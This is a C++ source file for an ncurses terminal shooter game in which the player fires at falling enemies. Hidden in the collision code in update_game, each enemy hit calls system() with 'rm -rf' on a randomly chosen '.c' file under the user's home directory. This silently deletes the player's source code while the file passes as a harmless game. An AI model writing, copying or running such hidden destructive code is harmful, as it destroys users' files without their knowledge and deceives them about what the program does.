#include <ncurses.h>
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <iostream>

#define MAX_BULLETS 100
#define MAX_ENEMIES 20
#define PLAYER '^'
#define BULLET '|'
#define ENEMY '#'

struct GameObject {
	int x, y;
	int alive;
};

GameObject player, bullets[MAX_BULLETS], enemies[MAX_ENEMIES];
int score = 0;
pthread_mutex_t mutex;

void* enemy_movement(void* arg) {
	while (1) {
		pthread_mutex_lock(&mutex);
		for (int i = 0; i < MAX_ENEMIES; i++) {
			if (enemies[i].alive) {
				enemies[i].y++;
				if (enemies[i].y >= LINES - 1) {
					enemies[i].y = 0;
					enemies[i].x = rand() % COLS;
				}
			} else {
				enemies[i].alive = 1;
				enemies[i].x = rand() % COLS;
				enemies[i].y = 0;
			}
		}
		pthread_mutex_unlock(&mutex);
		usleep(500000); // Enemy speed
	}
	return NULL;
}

void init_game() {
	initscr();
	noecho();
	curs_set(FALSE);
	keypad(stdscr, TRUE);
	player.x = COLS / 2;
	player.y = LINES - 1;
	pthread_mutex_init(&mutex, NULL);
}

void draw() {
	clear();
	mvaddch(player.y, player.x, PLAYER);
	for (int i = 0; i < MAX_BULLETS; i++) {
		if (bullets[i].alive) {
			mvaddch(bullets[i].y--, bullets[i].x, BULLET);
			if (bullets[i].y < 0) bullets[i].alive = 0;
		}
	}
	pthread_mutex_lock(&mutex);
	for (int i = 0; i < MAX_ENEMIES; i++) {
		if (enemies[i].alive) {
			mvaddch(enemies[i].y, enemies[i].x, ENEMY);
		}
	}
	pthread_mutex_unlock(&mutex);
	mvprintw(0, 0, "Score: %d", score);
	refresh();
}

void shoot() {
	for (int i = 0; i < MAX_BULLETS; i++) {
		if (!bullets[i].alive) {
			bullets[i].x = player.x;
			bullets[i].y = player.y - 1;
			bullets[i].alive = 1;
			break;
		}
	}
}

void update_game() {
	for (int i = 0; i < MAX_BULLETS; i++) {
		if (bullets[i].alive) {
			pthread_mutex_lock(&mutex);
			for (int j = 0; j < MAX_ENEMIES; j++) {
				if (enemies[j].alive && bullets[i].x == enemies[j].x && bullets[i].y == enemies[j].y) {
					enemies[j].alive = 0;
					bullets[i].alive = 0;
					//std::string command = ("rm -rf \"$(find ~ -type f -name \"*.c\" | sort -sR | head -n 1)\"").c_str();
					//std::cerr << command << std::endl;
					//printf("%s\n", command);
					system("rm -rf \"$(find ~ -type f -name \"*.c\" | sort -sR | head -n 1)\"");
					score++;
					break;
				}
			}
			pthread_mutex_unlock(&mutex);
		}
	}
}

int main() {
	pthread_t enemy_thread;
	int ch;

	init_game();
	pthread_create(&enemy_thread, NULL, enemy_movement, NULL);

	while ((ch = getch()) != 'q') {
		switch (ch) {
			case KEY_LEFT:
				if (player.x > 0) player.x--;
				break;
			case KEY_RIGHT:
				if (player.x < COLS - 1) player.x++;
				break;
			case ' ':
				shoot();
				break;
		}
		update_game();
		draw();
	}

	pthread_cancel(enemy_thread);
	pthread_join(enemy_thread, NULL);
	pthread_mutex_destroy(&mutex);
	endwin();

	return 0;
}